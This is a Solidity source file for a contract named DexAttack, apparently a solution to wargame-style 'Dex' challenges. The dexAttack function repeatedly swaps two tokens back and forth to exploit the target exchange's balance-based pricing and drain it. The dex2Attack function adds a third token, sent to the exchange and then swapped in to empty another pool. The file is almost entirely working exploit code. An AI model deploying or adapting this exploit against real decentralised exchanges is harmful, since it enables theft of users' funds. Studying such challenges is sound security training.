// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex {
  function swap(address from, address to, uint amount) external;
}
contract DexAttack {
    address token1;
    address token2;
    address token3;
    address dex;

    constructor(address _token1, address _token2, address _dex)
    {
        token1 = _token1;
        token2 = _token2;
        dex = _dex;
    }

    function setToken3(address _token3) public{
        token3 = _token3;
    }

    function dexAttack() external {
        IERC20(token1).transferFrom(msg.sender, address(this), 10);
        IERC20(token2).transferFrom(msg.sender, address(this), 10);

        IERC20(token1).approve(dex, type(uint).max);
        IERC20(token2).approve(dex, type(uint).max);

        IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this)));  
        IDex(dex).swap(token2, token1, IERC20(token2).balanceOf(address(this)));
        IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this)));
        IDex(dex).swap(token2, token1, IERC20(token2).balanceOf(address(this)));
        IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this)));
        IDex(dex).swap(token2, token1, 45);
    }

      function dex2Attack() external {
        IERC20(token1).transferFrom(msg.sender, address(this), 10);
        IERC20(token2).transferFrom(msg.sender, address(this), 10);

        IERC20(token1).approve(dex, type(uint).max);
        IERC20(token2).approve(dex, type(uint).max);

        IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this)));  
        IDex(dex).swap(token2, token1, IERC20(token2).balanceOf(address(this)));
        IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this)));
        IDex(dex).swap(token2, token1, IERC20(token2).balanceOf(address(this)));
        IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this)));
        IDex(dex).swap(token2, token1, 45);

        //At this point issue 90 tokens to the dex and 90 tokens to this address from token C
        //then call swap from C to B.
        IERC20(token3).transferFrom(msg.sender, dex, 90);
        IERC20(token3).transferFrom(msg.sender, address(this), 90);
        IERC20(token3).approve(dex, type(uint).max);

        IDex(dex).swap(token3, token2, IERC20(token3).balanceOf(address(this)));
    }


}